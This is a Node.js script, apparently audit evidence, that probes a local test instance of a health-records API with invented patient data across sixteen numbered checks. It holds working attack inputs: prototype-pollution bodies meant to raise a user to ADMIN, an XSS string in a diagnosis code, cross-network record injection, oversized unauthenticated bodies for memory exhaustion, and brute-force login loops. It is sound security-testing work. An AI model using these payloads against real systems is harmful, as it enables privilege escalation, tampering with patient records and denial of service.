// Evidencia Fase 2 — ver docs/produccion/F2_seguridad_servidor.md. Datos 100 % inventados (DNI 97xxxxxx y la semilla pac-sim).
// Uso: ADMIN_PASSWORD=<clave del servidor de prueba> BASE=http://127.0.0.1:3240 DATA_DIR=<carpeta del servidor> node 01_explotacion.js
// Se ejecuta contra un servidor NUEVO (srv.sh start). Cada bloque imprime «H-xx → resultado» para leerlo de corrido.
if (!process.env.ADMIN_PASSWORD) { console.error('Defina ADMIN_PASSWORD (la del servidor de prueba) y BASE'); process.exit(2); }
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const BASE = process.env.BASE || 'http://127.0.0.1:3240';

async function call(method, p, { token, body, raw, headers = {} } = {}) {
  const h = { ...headers };
  if (token) h.Authorization = 'Bearer ' + token;
  let payload;
  if (body !== undefined) { payload = raw ? body : JSON.stringify(body); h['Content-Type'] = h['Content-Type'] || 'application/json'; }
  const t0 = process.hrtime.bigint();
  const r = await fetch(BASE + p, { method, headers: h, body: payload });
  const text = await r.text();
  const ms = Number(process.hrtime.bigint() - t0) / 1e6;
  let json = null; try { json = JSON.parse(text); } catch (_) {}
  return { status: r.status, json, text, headers: r.headers, ms };
}
const diag = r => (r.json && (r.json.issue?.[0]?.diagnostics || r.json.error || r.json.message)) || r.text.slice(0, 120);
const log = (...a) => console.log(...a);

(async () => {
  const A = (await call('POST', '/api/auth/login', { body: { username: 'admin', password: process.env.ADMIN_PASSWORD } })).json.token;
  const pass = crypto.randomBytes(12).toString('base64url') + '-Aa1';
  const usuarios = [
    ['f2.coord.ps', 'COORDINADOR', '156', {}],
    ['f2.coord.pn', 'COORDINADOR', '157', {}],
    ['f2.coord.e41', 'COORDINADOR', '156', { establecimiento_id: '00001741' }],
    ['f2.coord.e44', 'COORDINADOR', '156', { establecimiento_id: '00001744' }],
    ['f2.coord.s6', 'COORDINADOR', '156', { sector_sanitario: 'Sector 6' }],
    ['f2.dir.ps', 'DIRECTOR', '156', {}]
  ];
  for (const [u, role, red, extra] of usuarios) {
    const r = await call('POST', '/api/users', { token: A, body: { username: u, nombre: 'Prueba F2 ' + u, role, red, password: pass, ...extra } });
    if (r.status !== 201) log('crear', u, r.status, diag(r));
  }
  const tok = {};
  for (const [u] of usuarios) tok[u] = (await call('POST', '/api/auth/login', { body: { username: u, password: pass } })).json.token;
  const CPS = tok['f2.coord.ps'];

  // Paciente de otra red (Pacífico Norte) creado por el ADMIN
  const PN = { id: 'pac-f2-pn-1', dni: '97000001', apellidos_nombres: 'PRUEBA NORTE UNO', red_salud: 'PACIFICO NORTE', sexo: 'F', fecha_nacimiento: '1960-01-01' };
  log('setup: ADMIN crea paciente de Pacífico Norte →', (await call('POST', '/api/padron/importar-lote', { token: A, body: [PN] })).status);
  const verPN = async () => (await call('GET', '/api/cronicos', { token: A })).json.find(p => p.id === PN.id);
  const antes = await verPN();
  log('setup: paciente PN antes → diagnosticos', JSON.stringify(antes.diagnosticos), '| pa', antes.pa_sistolica, '| citas', antes.appointments.length);
  log('setup: COORD Pacífico Sur ve el paciente PN en /api/cronicos →', (await call('GET', '/api/cronicos', { token: CPS })).json.some(p => p.id === PN.id));

  // H-01 Escritura cruzada de red por los hijos de /padron/importar-lote
  const r1 = await call('POST', '/api/padron/importar-lote', { token: CPS, body: [{
    dni: '10000001', id: PN.id,
    conditions: [{ cie10_cod: 'E11', diagnostico: 'INYECTADO-F2' }],
    observations: [{ fecha_registro: '2026-11-04', pa_sistolica: 210, pa_diastolica: 125 }],
    appointments: [{ fecha_cita: '2027-01-15' }]
  }] });
  const despues = await verPN();
  log('H-01 COORD Pacífico Sur envía DNI propio + id del paciente PN con hijos → status', r1.status);
  log('H-01   paciente PN después → diagnosticos', JSON.stringify(despues.diagnosticos), '| pa', despues.pa_sistolica + '/' + despues.pa_diastolica,
    '| citas', despues.appointments.length, '| condición inyectada:', JSON.stringify((despues.conditions || []).find(c => c.diagnostico === 'INYECTADO-F2') || null));

  // H-02 Oráculo de existencia de pacientes de otra red
  const pares = [
    ['GET eventos', id => call('GET', `/api/patients/${id}/eventos`, { token: CPS })],
    ['PUT consentimiento', id => call('PUT', `/api/patients/${id}/consentimiento`, { token: CPS, body: { consentimiento: 'No' } })],
    ['POST eventos', id => call('POST', `/api/patients/${id}/eventos`, { token: CPS, body: { tipo: 'control', fecha: '2026-11-01' } })],
    ['POST pre-cita', id => call('POST', '/api/appointments/pre-cita', { token: CPS, body: { patient_id: id } })],
    ['GET /fhir/Patient (control)', id => call('GET', `/fhir/Patient/${id}`, { token: CPS })]
  ];
  for (const [nombre, fn] of pares) {
    const existe = await fn('97000001');
    const noExiste = await fn('97999999');
    log(`H-02 ${nombre}: DNI de otra red → ${existe.status} «${diag(existe)}» | DNI inexistente → ${noExiste.status} «${diag(noExiste)}»`);
  }

  // H-03 ETag compartido entre usuarios con distinto alcance (misma red y rol)
  const e41 = await call('GET', '/api/cronicos', { token: tok['f2.coord.e41'] });
  const ps = await call('GET', '/api/cronicos', { token: CPS });
  const e44cond = await call('GET', '/api/cronicos', { token: tok['f2.coord.e44'], headers: { 'If-None-Match': ps.headers.get('etag') } });
  log('H-03 ETag COORD red completa =', ps.headers.get('etag'), `(${ps.json.length} pacientes) | ETag COORD est. 00001741 =`, e41.headers.get('etag'), `(${e41.json.length})`);
  log('H-03 COORD est. 00001744 con If-None-Match del COORD de red completa →', e44cond.status, '| Cache-Control:', ps.headers.get('cache-control'));

  // H-04 Cuerpo de 9,5 MB sin sesión: se analiza antes de exigir el token
  const grande = JSON.stringify({ relleno: 'x'.repeat(9.5 * 1024 * 1024) });
  const chico = await call('POST', '/api/cronicos', { body: { a: 1 } });
  const t = [];
  for (let i = 0; i < 3; i++) t.push((await call('POST', '/fhir/patients', { body: grande, raw: true })).ms);
  const g1 = await call('POST', '/fhir/patients', { body: grande, raw: true });
  const rssAntes = (await call('GET', '/health')).json.memory_rss_mb;
  await Promise.all(Array.from({ length: 20 }, () => call('POST', '/fhir/auth/login', { body: grande, raw: true })));
  const rssDespues = (await call('GET', '/health')).json.memory_rss_mb;
  log(`H-04 sin token: cuerpo chico → ${chico.status} en ${chico.ms.toFixed(1)} ms | 9,5 MB → ${g1.status} en ${t.map(x => x.toFixed(0)).join('/')} ms`);
  log(`H-04 20 cuerpos de 9,5 MB simultáneos a /fhir/auth/login sin sesión: RSS ${rssAntes} → ${rssDespues} MB`);

  // H-05 Claves heredadas de Object.prototype en el registro del paciente
  const r5 = await call('POST', '/api/padron/importar-lote', { token: CPS, body: [{ id: 'pac-sim-10000002', dni: '10000002', toString: 'x' }] });
  log('H-05 importar-lote con la clave "toString" sobre paciente existente →', r5.status, `«${diag(r5)}»`);
  const r5b = await call('POST', '/api/padron/importar-lote', { token: CPS, body: [
    { id: 'pac-f2-parcial', dni: '97000002', apellidos_nombres: 'PARCIAL F2', red_salud: 'PACIFICO SUR' },
    { id: 'pac-sim-10000003', dni: '10000003', hasOwnProperty: 'x' }
  ] });
  const quedo = (await call('GET', '/api/cronicos', { token: A })).json.some(p => p.dni === '97000002');
  log('H-05 lote [nuevo válido, existente con "hasOwnProperty"] →', r5b.status, '| ¿quedó guardado el primero pese al error?', quedo);

  // H-06 Valores inventados y código CIE-10 sin validar por FHIR
  const bundle = (dni, cond) => ({ resourceType: 'Bundle', entry: [
    { resource: { resourceType: 'Patient', id: `pac-00001741-${dni}`, identifier: [{ system: 'dni', value: dni }], name: [{ text: 'PRUEBA FHIR ' + dni }] } },
    { resource: Object.assign({ resourceType: 'Condition', subject: { reference: `Patient/pac-00001741-${dni}` } }, cond) }
  ] });
  const r6 = await call('POST', '/fhir/Bundle', { token: CPS, body: bundle('97000003', {}) });
  const p6 = (await call('GET', '/api/cronicos', { token: A })).json.find(p => p.dni === '97000003');
  log('H-06 Condition SIN código → status', r6.status, '| diagnósticos guardados', JSON.stringify(p6 && p6.diagnosticos));
  const r6b = await call('POST', '/fhir/Bundle', { token: CPS, body: bundle('97000004', { code: { coding: [{ code: '<img src=x onerror=alert(1)>' }] } }) });
  const p6b = (await call('GET', '/api/cronicos', { token: A })).json.find(p => p.dni === '97000004');
  log('H-06 Condition con código HTML → status', r6b.status, '| guardado', JSON.stringify(p6b && p6b.diagnosticos));

  // H-07 Mensajes internos en errores 400 y 500
  const r7a = await call('POST', '/fhir/Bundle', { token: CPS, body: bundle('97000005', { code: { coding: [{ code: 123 }] } }) });
  const r7b = await call('POST', '/api/appointments/pre-cita', { token: CPS, body: { patient_id: { toString: 1 } } });
  const r7c = await call('POST', '/api/appointments/pre-cita', { token: CPS, body: '{"patient_id": ', raw: true });
  log('H-07 código CIE-10 numérico →', r7a.status, `«${diag(r7a)}»`);
  log('H-07 patient_id objeto sin toString →', r7b.status, `«${diag(r7b)}»`);
  log('H-07 JSON roto →', r7c.status, `«${diag(r7c)}»`);

  // H-08 Asignación masiva: el cliente fija la trazabilidad y cualquier campo
  const r8 = await call('POST', '/api/padron/importar-lote', { token: CPS, body: [{ id: 'pac-sim-10000004', dni: '10000004', actualizado_por: 'admin', fuente: 'HOSIX', campo_arbitrario: 'z'.repeat(200000) }] });
  const p8 = (await call('GET', '/api/cronicos', { token: A })).json.find(p => p.id === 'pac-sim-10000004');
  log('H-08 COORD fija actualizado_por="admin", fuente y un campo de 200 KB →', r8.status, '| guardado: actualizado_por =', p8.actualizado_por, '| fuente =', p8.fuente, '| campo_arbitrario =', (p8.campo_arbitrario || '').length, 'caracteres');

  // H-09 Sector por subcadena
  const s6 = (await call('GET', '/api/cronicos', { token: tok['f2.coord.s6'] })).json;
  log('H-09 COORD con sector "Sector 6" ve', s6.length, 'pacientes de los sectores', JSON.stringify([...new Set(s6.map(p => p.sector_sanitario))]));

  // H-10 COORD acotado a un establecimiento mueve un paciente fuera de su alcance
  const r10 = await call('POST', '/api/padron/importar-lote', { token: tok['f2.coord.e41'], body: [{ id: 'pac-sim-10000001', dni: '10000001', puerta_entrada_id: '00001744' }] });
  const ve41 = (await call('GET', '/api/cronicos', { token: tok['f2.coord.e41'] })).json.some(p => p.id === 'pac-sim-10000001');
  const r10b = await call('POST', '/api/padron/importar-lote', { token: tok['f2.coord.e41'], body: [{ id: 'pac-sim-10000002', dni: '10000002', puerta_entrada_id: '00001741' }] });
  log('H-10 COORD est. 00001741 mueve su paciente a 00001744 →', r10.status, '| ¿lo sigue viendo?', ve41, '| traer uno de 00001744 a 00001741 →', r10b.status);

  // H-11 Contaminación de prototipos
  const r11 = await call('PATCH', '/api/users/f2.coord.ps', { token: A, body: JSON.parse('{"__proto__":{"role":"ADMIN"},"constructor":{"prototype":{"role":"ADMIN"}},"nombre":"Prueba F2 proto"}') });
  const me = await call('GET', '/api/auth/me', { token: CPS });
  const r11b = await call('POST', '/api/padron/importar-lote', { token: CPS, body: JSON.parse('[{"id":"pac-sim-10000005","dni":"10000005","__proto__":{"red_salud":"PACIFICO NORTE"},"conditions":[{"__proto__":{"x":1},"cie10_cod":"I10"}]}]') });
  const r11c = await call('GET', '/api/cronicos?__proto__[role]=ADMIN&constructor[prototype][role]=ADMIN', { token: CPS });
  const meDir = await call('GET', '/api/auth/me', { token: tok['f2.dir.ps'] });
  log('H-11 PATCH con __proto__/constructor →', r11.status, '| rol del COORD después:', me.json.user.role, '| lote con __proto__ →', r11b.status, '| query con __proto__ →', r11c.status, '| rol del DIRECTOR:', meDir.json.user.role);

  // H-12 Lecturas de datos de pacientes en la bitácora
  const logs = (await call('GET', '/api/security/audit-logs?limit=500', { token: A })).json.logs;
  const eventos = {};
  for (const l of logs) eventos[l.evento] = (eventos[l.evento] || 0) + 1;
  log('H-12 eventos en la bitácora tras las lecturas de /api/cronicos, /fhir/Patient y eventos:', JSON.stringify(eventos));
  const pre = logs.find(l => l.evento === 'PRE_CITA_GENERADA' || l.evento === 'BULK_IMPORT');
  log('H-12 ejemplo de payload guardado:', pre ? pre.payload_json.slice(0, 160) : '(ninguno)');

  // H-13 Permisos del archivo de datos
  if (process.env.DATA_DIR) {
    await new Promise(r => setTimeout(r, 800));
    for (const f of ['store.json', 'store.json.bak']) {
      const fp = path.join(process.env.DATA_DIR, f);
      if (fs.existsSync(fp)) log(`H-13 ${f}: modo ${(fs.statSync(fp).mode & 0o777).toString(8)} | ¿texto plano legible? ${fs.readFileSync(fp, 'utf8').includes('PRUEBA NORTE UNO')}`);
    }
  }

  // H-14 CORS desde un origen ajeno
  const pf = await fetch(BASE + '/api/cronicos', { method: 'OPTIONS', headers: { Origin: 'https://ajeno.example', 'Access-Control-Request-Method': 'GET', 'Access-Control-Request-Headers': 'authorization' } });
  log('H-14 preflight desde https://ajeno.example →', pf.status, '| ACAO:', pf.headers.get('access-control-allow-origin'), '| ACAH:', pf.headers.get('access-control-allow-headers'));
  const csp = (await fetch(BASE + '/')).headers.get('content-security-policy');
  log('H-15 CSP de la página:', csp);

  // H-16 Límite de tasa: /fhir/auth/login sin tope (S-02); al final porque consume el cupo
  let c429 = 0; let c401 = 0;
  for (let i = 0; i < 130; i++) { const r = await call('POST', '/fhir/auth/login', { body: { username: 'nadie' + i, password: 'x' } }); if (r.status === 429) c429++; else if (r.status === 401) c401++; }
  log(`H-16 130 logins fallidos por /fhir/auth/login con usuarios distintos → ${c401} × 401, ${c429} × 429`);
  // Después de la Fase 2 /fhir/auth/login ya no existe (401 sin token); el único login es /api/auth/login, con cupo propio por IP
  c429 = 0; c401 = 0;
  for (let i = 0; i < 130; i++) { const r = await call('POST', '/api/auth/login', { body: { username: 'otro' + i, password: 'x' } }); if (r.status === 429) c429++; else if (r.status === 401) c401++; }
  log(`H-16 130 logins fallidos por /api/auth/login con usuarios distintos → ${c401} × 401, ${c429} × 429`);
})().catch(e => { console.error('ERROR', e); process.exit(1); });
